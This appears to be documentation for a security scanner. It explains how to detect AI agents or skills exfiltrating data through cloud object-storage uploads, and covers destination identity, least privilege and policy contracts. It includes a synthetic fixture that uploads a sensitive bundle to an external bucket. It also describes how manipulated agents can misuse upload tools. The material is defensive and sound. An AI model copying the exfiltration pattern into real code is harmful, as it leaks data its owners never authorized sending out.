Object storage is a normal part of modern engineering. Build systems upload artifacts, data pipelines write datasets, backup jobs replicate files, and deployment workflows publish bundles. That ubiquity makes cloud storage an attractive exfiltration channel: an upload can look operationally ordinary even when the destination belongs to a different trust domain.

The relevant security relation is:

```text
LOCAL_OR_SENSITIVE_DATA -> CLOUD_OBJECT_STORAGE_UPLOAD_SINK
```

The sink alone is not enough. The scanner must consider payload class, destination identity, and whether the transfer is justified by the artifact's declared purpose.

## Why object storage deserves a separate boundary model

Generic HTTP detectors can miss the semantics of cloud SDKs. A call such as `put_object`, `upload_blob`, or `upload_from_filename` may not contain a visible HTTP request or URL. Credentials and endpoints are resolved by the SDK.

Similarly, CLI forms may encode cloud transfer through commands rather than source-code APIs.

That is why `skil` separates cloud-boundary signatures from generic network analysis with controls such as `SKIL-BOUNDARY-CLOUD-EXFIL` and `SKIL-BOUNDARY-CLOUD-SDK-UPLOAD`.[^skil-matrix]

## A safe positive fixture

A synthetic example can show the sink without exposing a real target:

```python
client.put_object(
    Bucket="external-drop",
    Key="bundle.bin",
    Body=sensitive_bundle,
)
```

The security evidence is the combination of a sensitive payload and a destination not established as approved.

A legitimate counterpart might be:

```python
client.put_object(
    Bucket=approved_bucket,
    Key=artifact_name,
    Body=build_artifact,
)
# destination and artifact class are constrained by policy
```

Both are uploads. Only the first lacks an approved transfer contract.

## Destination identity has multiple layers

“Bucket name” is not enough to determine trust. Cloud object storage should be classified by:

- cloud provider,
- account/project/subscription,
- tenant or organization,
- bucket/container identity,
- region where relevant,
- access policy,
- destination purpose.

A bucket named `company-builds` in an attacker's account is not trusted because the name looks familiar.

Runtime policy should rely on authenticated resource identity rather than naming conventions.

## Identity is part of the exfiltration boundary

Cloud uploads are performed under credentials. If an agent uses an identity with permission to write arbitrary buckets or accounts, the blast radius is much larger than if it can write only one organization-controlled artifact bucket.

Least privilege therefore applies in two dimensions:

```text
what data may be uploaded?
where may it be uploaded?
```

A strong service identity may allow only `PutObject`-like operations on a narrow resource prefix, with no read/list/admin capability.

## Taint analysis and cloud-specific sinks

A generic source-to-sink engine can model:

```text
secret_bundle
   ↓
archive
   ↓
SDK upload call
```

while the boundary analyzer classifies the sink as cloud object storage and extracts destination arguments.

This separation helps support multiple SDKs without duplicating dataflow logic.

## CLI versus SDK evidence

CLI uploads and SDK uploads have different syntactic forms. A scanner can normalize both into a common intermediate event:

```yaml
operation: cloud_object_upload
provider: aws|gcp|azure|other
destination: symbolic_resource
payload: tainted_or_unclassified
source_form: sdk|cli
```

This creates consistent findings while preserving implementation-specific evidence.

## Legitimate artifact publication

CI/CD pipelines frequently upload artifacts. The security distinction is purpose binding.

A reviewed contract can specify:

```yaml
uploads:
  - class: build_artifact
    destination: org-artifacts/releases/**
    encryption: required
    provenance_attestation: required
```

The scanner can then compare observed behavior against the contract.

If a skill intended only to review source code suddenly uploads repository contents to an unrelated bucket, the mismatch is meaningful even if the SDK call is syntactically valid.

## Cloud storage and provenance

Supply-chain systems increasingly attach provenance to artifacts. For agentic workflows, provenance can also help determine whether an upload is expected:

- which task produced the object,
- which repository revision was involved,
- which agent/skill initiated the upload,
- which identity authorized it,
- which policy decision permitted it.

A signed or tamper-evident evidence package makes incident investigation far easier than a raw cloud audit log alone.

## Evidence chain

A useful scanner result might be:

```yaml
property: cloud-storage-exfiltration
controls:
  - SKIL-BOUNDARY-CLOUD-EXFIL
  - SKIL-BOUNDARY-CLOUD-SDK-UPLOAD
source:
  class: repository_or_sensitive_data
sink:
  kind: object_storage_upload
  provider: detected
  destination: external_or_unresolved
contract_match: false
identity_scope: unknown
```

If taint analysis can prove a sensitive source reaches the upload body, that should be attached as a separate evidence path.

## False positives and reviewed exceptions

Legitimate patterns include:

- backups,
- artifact publication,
- model/data pipeline outputs,
- approved support bundles,
- disaster-recovery replication.

A rule should not simply suppress these based on function names. Instead, the system can use destination allowlists, artifact classes, repository policy, or signed exceptions.

## Runtime policy: constrain the destination, not just the model

Strong controls include:

- scoped cloud identities,
- resource-level IAM restrictions,
- organization policies preventing writes outside approved accounts,
- egress controls,
- encryption requirements,
- bucket ownership validation,
- object-size and content policies,
- audit logs with caller identity.

OWASP's Excessive Agency guidance is directly relevant: excessive functionality, permissions, and autonomy turn ordinary tools into damaging capabilities.[^owasp-agency]

## Information-flow view

As with HTTP exfiltration, the theoretical model is an information-flow problem. Denning's classic work provides the conceptual foundation: data should not flow from a higher-sensitivity class to an unauthorized lower-trust domain.[^denning]

Cloud object storage simply gives the sink a richer identity model than a generic URL.

## Multi-cloud complications

Organizations often use several providers. A cross-cloud upload may be legitimate, but policy needs to express it explicitly. Scanner design should avoid assuming that “same provider” means trusted or “different provider” means malicious.

The true boundary is organizational authorization.

## Limits

Static analysis may not resolve dynamic bucket names, credentials, account IDs, endpoint overrides, or runtime IAM. SDK wrappers can hide upload calls. Conversely, local test doubles may look like cloud APIs without making any external request.

Findings should distinguish literal, inferred, and unresolved destination evidence.

<KeyTakeaway>
Cloud Storage Exfiltration is not defined by the presence of an upload call. It is the **movement of data into an object-storage trust domain that the task is not authorized to use**.
</KeyTakeaway>

## Conclusion

Cloud object storage is a powerful, legitimate integration surface and therefore a credible exfiltration path. Secure detection combines cloud-specific sink recognition with payload classification and destination policy. Secure execution goes further by restricting identities and resource scopes so that even a compromised or manipulated agent cannot choose an arbitrary external bucket.
